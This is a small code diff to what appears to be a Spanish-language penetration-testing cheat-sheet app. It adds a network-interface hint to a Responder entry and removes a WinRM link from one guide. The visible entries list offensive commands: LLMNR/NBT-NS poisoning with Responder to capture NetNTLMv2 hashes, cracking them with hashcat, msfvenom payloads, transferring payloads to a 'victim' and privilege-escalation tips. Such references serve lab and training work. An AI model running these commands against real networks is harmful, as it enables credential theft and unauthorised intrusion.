@@ -383,7 +383,7 @@ const D = [
   ["other","Comprobar SNMP con NSE","snmp-info confirma la versión y datos del sistema si el 161/UDP responde","nmap -sU -p161 --script snmp-info {IP}"],
 
   // ===== 9b. Ataques de red / MITM (Responder) =====
-  ["network","Capturar hashes con Responder","envenena LLMNR/NBT-NS/mDNS en la red local; cualquier host que busque un recurso mal escrito te manda su hash NetNTLMv2","sudo responder -I eth0"],
+  ["network","Capturar hashes con Responder","envenena LLMNR/NBT-NS/mDNS en la red local; cualquier host que busque un recurso mal escrito te manda su hash NetNTLMv2. Comprueba el nombre de tu interfaz con 'ip a' si no es eth0","sudo responder -I eth0"],
   ["network","Crackear el hash capturado (NetNTLMv2)","-m 5600 es el modo NetNTLMv2 de hashcat; el hash lo copia Responder a /usr/share/responder/logs","hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt"],
 
   // ===== 10. Búsqueda de exploits =====
@@ -827,7 +827,7 @@ const GUIDES = [
     "Sin shell aún: genera payload con <code>msfvenom -p windows/... -f exe</code> y pásalo con certutil o PowerShell.",
     "Escalada: <code>whoami /priv</code> (SeImpersonate → Potato), <code>systeminfo</code> para exploits, y WinPEAS.",
   ],"Con credenciales válidas, WinRM (evil-winrm) es la vía más limpia para tener consola en Windows.",
-  [["winrm","Ver comandos de WinRM/NetExec"],["transfer","Pasar el payload a la víctima"]]],
+  [["transfer","Pasar el payload a la víctima"]]],
 
   ["📤","Cómo paso archivos a la víctima","transfer",[
     "En tu Kali, sirve la carpeta: <code>python3 -m http.server 8000</code>.",
